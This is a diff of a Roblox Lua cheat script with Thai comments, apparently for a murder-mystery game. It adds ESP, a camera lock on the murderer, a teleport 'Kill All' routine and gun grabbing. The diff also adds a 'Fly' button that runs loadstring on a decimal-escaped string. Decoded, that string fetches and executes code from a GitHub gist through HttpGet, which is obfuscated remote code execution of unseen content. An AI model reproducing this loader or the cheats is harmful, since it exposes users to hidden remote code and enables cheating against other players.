@@ -1,6 +1,7 @@
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local TeleportService = game:GetService("TeleportService")
+local SoundService = game:GetService("SoundService")
 local player = Players.LocalPlayer
 local camera = workspace.CurrentCamera
 
@@ -10,11 +11,23 @@ local killAuraEnabled = true
 local uiVisible = true
 local isAction = false
 
+-- [[ ระบบเสียง ]]
+local CLICK_SOUND_ID = "rbxassetid://140691817123595"
+
+local function playUiSound()
+    local sound = Instance.new("Sound")
+    sound.SoundId = CLICK_SOUND_ID
+    sound.Volume = 1
+    sound.Parent = SoundService
+    sound:Play()
+    sound.Ended:Connect(function() sound:Destroy() end)
+end
+
 ----------------------------------------------------------------
 -- 1. สร้างโครงสร้าง UI
 ----------------------------------------------------------------
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "FarHub_V31_FixButton"
+screenGui.Name = "FarHub_V57_Final"
 screenGui.Parent = player:WaitForChild("PlayerGui")
 screenGui.ResetOnSpawn = false
 
@@ -23,7 +36,6 @@ mainFrame.AutomaticSize = Enum.AutomaticSize.Y
 mainFrame.Size = UDim2.new(0, 200, 0, 0)
 mainFrame.Position = UDim2.new(0.5, -100, 0.5, -120)
 mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-mainFrame.Visible = true
 mainFrame.Parent = screenGui
 Instance.new("UICorner", mainFrame)
 
@@ -49,7 +61,7 @@ hideButton.Parent = screenGui
 Instance.new("UICorner", hideButton)
 
 ----------------------------------------------------------------
--- 2. ฟังก์ชันช่วย
+-- 2. ฟังก์ชันช่วยสร้าง UI
 ----------------------------------------------------------------
 local function checkInventory(p, name)
     if not p then return false end
@@ -66,6 +78,12 @@ local function createBlueButton(text)
     btn.TextSize = 13
     btn.Parent = mainFrame
     Instance.new("UICorner", btn)
+    
+    -- เพิ่มเสียงให้ทุกปุ่มที่สร้างผ่านฟังก์ชันนี้
+    btn.MouseButton1Click:Connect(function()
+        playUiSound()
+    end)
+    
     return btn
 end
 
@@ -84,10 +102,11 @@ local function createWarning(text, color)
 end
 
 ----------------------------------------------------------------
--- 3. ปุ่มและการทำงาน (แก้ไข Logic ไม่ให้ค้าง)
+-- 3. ปุ่มและการทำงาน
 ----------------------------------------------------------------
-local lockButton = createBlueButton("Aimbot: OFF")
+local lockButton = createBlueButton("Lock Murder: OFF")
 local espButton = createBlueButton("ESP: OFF")
+local flyButton = createBlueButton("Fly")
 
 local grabButton = createBlueButton("Grab Gun")
 createWarning("⚠️ นายอำเภอตายแล้วปืนตกพื้น ค่อยกดปุ่ม Grab Gun", Color3.fromRGB(255, 200, 0))
@@ -97,68 +116,79 @@ createWarning("⚠️ คุณต้องเป็นฆาตกรก่อ�
 
 local rejoinButton = createBlueButton("Rejoin Server")
 
--- [[ Logic แก้ปุ่ม Kill All ค้าง ]]
+-- [[ LOGIC: Hide UI + Sound ]]
+hideButton.MouseButton1Click:Connect(function()
+    playUiSound()
+    uiVisible = not uiVisible 
+    mainFrame.Visible = uiVisible
+end)
+
+-- [[ LOGIC: Fly ]]
+flyButton.MouseButton1Click:Connect(function()
+    pcall(function()
+        loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
+    end)
+    flyButton.Text = "Success🔥"
+    task.wait(2)
+    flyButton.Text = "Fly"
+end)
+
+-- [[ LOGIC: Kill All ]]
 killAllButton.MouseButton1Click:Connect(function()
     if isAction then return end
-    
     local knife = player.Character:FindFirstChild("Knife") or player.Backpack:FindFirstChild("Knife")
     
     if not knife then
-        -- ใช้ task.spawn เพื่อให้แจ้งเตือนทำงานแยกกัน ไม่ขัดขวางปุ่ม
         task.spawn(function()
-            isAction = true -- ล็อคชั่วคราวขณะแสดงข้อความ
+            isAction = true
             local oldText = killAllButton.Text
-            killAllButton.Text = "❌ คุณไม่ใช่ฆาตกร!"
+            killAllButton.Text = "❌ ไม่พบมีด!"
             killAllButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
-            task.wait(1.5)
+            task.wait(2)
             killAllButton.Text = oldText
             killAllButton.BackgroundColor3 = Color3.fromRGB(0, 120, 200)
-            isAction = false -- ปลดล็อคให้กดได้ใหม่
+            isAction = false
         end)
         return
     end
-
-    -- เริ่มทำงานวาร์ปฆ่า
+    
     isAction = true
-    local char = player.Character
-    local root = char.HumanoidRootPart
-    local oldPos = root.CFrame
+    local oldPos = player.Character.HumanoidRootPart.CFrame
     for _, victim in pairs(Players:GetPlayers()) do
         if victim ~= player and victim.Character and victim.Character:FindFirstChild("Humanoid") and victim.Character.Humanoid.Health > 0 then
-            knife.Parent = char
-            root.CFrame = victim.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
+            knife.Parent = player.Character
+            player.Character.HumanoidRootPart.CFrame = victim.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
             task.wait(0.25)
         end
     end
-    root.CFrame = oldPos
+    player.Character.HumanoidRootPart.CFrame = oldPos
     isAction = false
 end)
 
--- ปุ่มอื่นๆ ทำงานปกติ
-hideButton.MouseButton1Click:Connect(function() uiVisible = not uiVisible mainFrame.Visible = uiVisible end)
-lockButton.MouseButton1Click:Connect(function() isLocking = not isLocking lockButton.Text = isLocking and "Aimbot: ON" or "Aimbot: OFF" lockButton.BackgroundColor3 = isLocking and Color3.fromRGB(0, 200, 255) or Color3.fromRGB(0, 120, 200) end)
-espButton.MouseButton1Click:Connect(function() espEnabled = not espEnabled espButton.Text = espEnabled and "ESP: ON" or "ESP: OFF" espButton.BackgroundColor3 = espEnabled and Color3.fromRGB(0, 200, 255) or Color3.fromRGB(0, 120, 200) if not espEnabled then for _, op in pairs(Players:GetPlayers()) do if op.Character then local hl = op.Character:FindFirstChild("FarHubESP") if hl then hl:Destroy() end end end end end)
-grabButton.MouseButton1Click:Connect(function() if isAction then return end local gun = workspace:FindFirstChild("GunDrop", true) or workspace:FindFirstChild("Handle", true) if gun and gun:IsA("BasePart") and not gun:IsDescendantOf(player.Character) then isAction = true local root = player.Character.HumanoidRootPart local oldPos = root.CFrame root.CFrame = gun.CFrame task.wait(0.4) root.CFrame = oldPos isAction = false else grabButton.Text = "❌ ไม่พบปืน" task.wait(1) grabButton.Text = "Grab Gun" end end)
+-- ปุ่มอื่นๆ
+lockButton.MouseButton1Click:Connect(function() isLocking = not isLocking lockButton.Text = isLocking and "Lock Murder: ON" or "Lock Murder: OFF" lockButton.BackgroundColor3 = isLocking and Color3.fromRGB(0, 200, 255) or Color3.fromRGB(0, 120, 200) end)
+espButton.MouseButton1Click:Connect(function() espEnabled = not espEnabled espButton.Text = espEnabled and "ESP: ON" or "ESP: OFF" espButton.BackgroundColor3 = espEnabled and Color3.fromRGB(0, 200, 255) or Color3.fromRGB(0, 120, 200) end)
+grabButton.MouseButton1Click:Connect(function() if isAction then return end local gun = workspace:FindFirstChild("GunDrop", true) or workspace:FindFirstChild("Handle", true) if gun and gun:IsA("BasePart") then isAction = true local root = player.Character.HumanoidRootPart local oldPos = root.CFrame root.CFrame = gun.CFrame task.wait(0.4) root.CFrame = oldPos isAction = false end end)
 rejoinButton.MouseButton1Click:Connect(function() TeleportService:Teleport(game.PlaceId, player) end)
 
 ----------------------------------------------------------------
--- 4. ระบบเบื้องหลัง (Kill Aura / ESP / Aimbot)
+-- 4. ระบบเบื้องหลัง (ESP / Aura / Hard Lock)
 ----------------------------------------------------------------
 RunService.RenderStepped:Connect(function()
-    local char = player.Character
-    local knife = char and char:FindFirstChild("Knife")
-    if knife and killAuraEnabled then
+    if not player.Character then return end
+    
+    if isLocking then
+        local target = nil
+        local dist = 300
         for _, op in pairs(Players:GetPlayers()) do
-            if op ~= player and op.Character and op.Character:FindFirstChild("HumanoidRootPart") then
-                local dist = (char.HumanoidRootPart.Position - op.Character.HumanoidRootPart.Position).Magnitude
-                if dist < 15 then
-                    knife:Activate()
-                    firetouchinterest(op.Character.HumanoidRootPart, knife.Handle, 0)
-                    firetouchinterest(op.Character.HumanoidRootPart, knife.Handle, 1)
-                end
+            if op ~= player and checkInventory(op, "Knife") then
+                local head = op.Character and op.Character:FindFirstChild("Head")
+                if head then target = head break end
             end
         end
+        if target then camera.CFrame = CFrame.new(camera.CFrame.Position, target.Position) end
     end
+
     if espEnabled then
         for _, op in pairs(Players:GetPlayers()) do
             if op ~= player and op.Character then
@@ -170,17 +200,10 @@ RunService.RenderStepped:Connect(function()
                 hl.Enabled = true
             end
         end
-    end
-    if isLocking then
-        local target = nil
-        local dist = 200
+    else
         for _, op in pairs(Players:GetPlayers()) do
-            if op ~= player and checkInventory(op, "Knife") then
-                local head = op.Character and op.Character:FindFirstChild("Head")
-                if head and (player.Character.HumanoidRootPart.Position - head.Position).Magnitude < dist then target = head dist = (player.Character.HumanoidRootPart.Position - head.Position).Magnitude end
-            end
+            local hl = op.Character and op.Character:FindFirstChild("FarHubESP")
+            if hl then hl:Destroy() end
         end
-        if target then camera.CFrame = camera.CFrame:Lerp(CFrame.new(camera.CFrame.Position, target.Position), 0.15) end
     end
 end)
-
